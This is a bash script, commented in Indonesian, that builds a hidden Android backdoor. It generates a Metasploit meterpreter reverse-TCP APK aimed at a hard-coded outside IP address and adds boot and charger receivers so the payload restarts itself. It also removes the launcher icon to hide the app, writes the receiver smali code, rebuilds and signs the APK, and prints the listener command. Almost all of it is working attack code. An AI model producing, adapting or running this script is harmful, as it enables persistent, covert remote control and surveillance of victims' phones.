#!/bin/bash

# === KONFIGURASI ===
LHOST="8.215.192.205"
LPORT="4444"
PAYLOAD_NAME="payload.apk"
DECOMPILE_DIR="payload_dec"
MOD_APK="payload_mod.apk"
KEYSTORE="mykey.keystore"
ALIAS="key0"
STOREPASS="password"
KEYPASS="password"

# === 1. Generate Payload ===
echo "[1] Membuat payload APK..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "$PAYLOAD_NAME"

# === 2. Decompile APK ===
echo "[2] Decompile APK..."
apktool d "$PAYLOAD_NAME" -o "$DECOMPILE_DIR"

MANIFEST="$DECOMPILE_DIR/AndroidManifest.xml"

# === 3. Edit Manifest ===
echo "[3] Tambah permission & receiver..."
# Tambah permission BOOT
sed -i '/<\/manifest>/i \<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />' "$MANIFEST"

# Tambah receiver BOOT
sed -i '/<\/application>/i \
<receiver android:name="com.metasploit.stage.BootReceiver" android:enabled="true" android:exported="true">\
<intent-filter>\
<action android:name="android.intent.action.BOOT_COMPLETED" />\
</intent-filter>\
</receiver>' "$MANIFEST"

# Tambah receiver CHARGER
sed -i '/<\/application>/i \
<receiver android:name="com.metasploit.stage.PowerReceiver" android:enabled="true" android:exported="true">\
<intent-filter>\
<action android:name="android.intent.action.ACTION_POWER_CONNECTED" />\
</intent-filter>\
</receiver>' "$MANIFEST"

# Sembunyikan ikon launcher
sed -i '/android.intent.action.MAIN/,/category.LAUNCHER/d' "$MANIFEST"

# === 4. Tambah Receiver.smali ===
echo "[4] Tambahkan BootReceiver dan PowerReceiver..."

BOOT_RECEIVER="$DECOMPILE_DIR/smali/com/metasploit/stage/BootReceiver.smali"
POWER_RECEIVER="$DECOMPILE_DIR/smali/com/metasploit/stage/PowerReceiver.smali"
mkdir -p "$(dirname "$BOOT_RECEIVER")"

cat <<EOF > "$BOOT_RECEIVER"
.class public Lcom/metasploit/stage/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/metasploit/stage/MainService;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method
EOF

cat <<EOF > "$POWER_RECEIVER"
.class public Lcom/metasploit/stage/PowerReceiver;
.super Landroid/content/BroadcastReceiver;
.source "PowerReceiver.java"

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/metasploit/stage/MainService;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method
EOF

# === 5. Build Ulang APK ===
echo "[5] Recompile APK..."
apktool b "$DECOMPILE_DIR" -o "$MOD_APK"

# === 6. Buat Keystore Jika Belum Ada ===
if [ ! -f "$KEYSTORE" ]; then
    echo "[6] Generate keystore..."
    keytool -genkey -v -keystore "$KEYSTORE" -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 10000 <<EOF
$STOREPASS
$STOREPASS
Backdoor Trigger
CyberLab
MyOrg
Jakarta
Jawa
ID
yes
EOF
fi

# === 7. Sign APK ===
echo "[7] Sign APK..."
jarsigner -verbose -keystore "$KEYSTORE" -storepass "$STOREPASS" -keypass "$KEYPASS" "$MOD_APK" "$ALIAS"

# === 8. Output ===
echo "[✓] Sukses! APK hasil: $MOD_APK"
echo
echo "[!] Jalankan listener Metasploit:"
echo
echo "msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit'"
